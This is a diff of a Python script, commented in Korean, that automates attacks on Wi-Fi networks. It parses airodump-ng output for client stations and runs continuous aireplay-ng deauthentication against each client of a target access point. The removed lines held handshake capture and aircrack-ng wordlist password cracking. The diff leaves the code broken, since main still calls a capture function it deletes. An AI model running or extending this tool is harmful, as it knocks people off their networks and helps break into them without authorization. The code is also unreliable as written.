@@ -10,46 +10,35 @@ def get_network_interfaces():
     return interfaces
 
 # CSV 파일에서 BSSID, ESSID, 채널 정보 추출
-def parse_airodump_csv(csv_filename):
-    networks = []
+def parse_clients_csv(csv_filename):
+    clients = []
     try:
         with open(csv_filename, mode='r', encoding='utf-8') as file:
             reader = csv.reader(file)
             for row in reader:
-                if len(row) > 0 and row[0].strip().upper() == 'BSSID':
-                    # 네트워크 정보가 시작되는 다음 행으로 이동
+                if len(row) > 0 and row[0].strip().upper() == 'STATION':
+                    # 클라이언트 정보가 시작되는 다음 행으로 이동
                     next(reader)
-                    for network_row in reader:
-                        if len(network_row) < 2:
-                            break  # 네트워크 목록이 끝났으므로 종료
-                        bssid = network_row[0].strip()
-                        essid = network_row[13].strip()
-                        channel = network_row[3].strip()
-                        networks.append((bssid, essid, channel))
-                        print(f"[{len(networks)}] {bssid}       {essid}       C: {channel}")
+                    for client_row in reader:
+                        if len(client_row) < 2:
+                            break  # 클라이언트 목록이 끝났으므로 종료
+                        station = client_row[0].strip()
+                        clients.append(station)
+                        print(f"클라이언트: {station}")
     except FileNotFoundError:
         print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다. airodump-ng가 데이터를 수집하는 동안 기다려주세요.")
-    return networks
+    return clients
 
 # 선택된 네트워크 정보를 target.csv에 저장하고 aireplay-ng 실행
-def run_aireplay(bssid, interface, essid):
+def run_aireplay(bssid, interface, clients):
     # 선택된 네트워크 정보를 target.csv에 저장
     with open("target.csv", "w") as file:
-        file.write(f"BSSID,ESSID\n{bssid},{essid}\n")
+        file.write(f"BSSID,ESSID\n{bssid}\n")
     
-    # aireplay-ng 명령 실행
-    aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, interface]
-    subprocess.run(aireplay_cmd)
-
-def capture_handshake(interface, bssid, channel):
-    # airodump-ng로 핸드셰이크 캡처
-    airodump_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", "handshake", interface]
-    subprocess.run(airodump_cmd, timeout=60)  # 60초 동안 핸드셰이크 캡처 시도
-
-def crack_password(handshake_file, wordlist):
-    # aircrack-ng로 비밀번호 크랙
-    aircrack_cmd = ["sudo", "aircrack-ng", "-w", wordlist, "-b", handshake_file]
-    subprocess.run(aircrack_cmd)
+    for client in clients:
+        # aireplay-ng 명령 실행
+        aireplay_cmd = ["sudo", "aireplay-ng", "-0", "0", "-a", bssid, "-c", client, interface]
+        subprocess.run(aireplay_cmd)
 
 def main():
     # 네트워크 인터페이스 출력
@@ -105,8 +94,11 @@ def main():
         bssid, essid, channel = selected_network
         print(f"선택한 네트워크: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
         
+        # 클라이언트 정보 추출
+        clients = parse_clients_csv(csv_filename)
+
         # aireplay-ng 실행 및 target.csv에 기록
-        run_aireplay(bssid, selected_interface, essid)
+        run_aireplay(bssid, selected_interface, clients)
 
         # 핸드셰이크 캡처
         capture_handshake(selected_interface, bssid, channel)
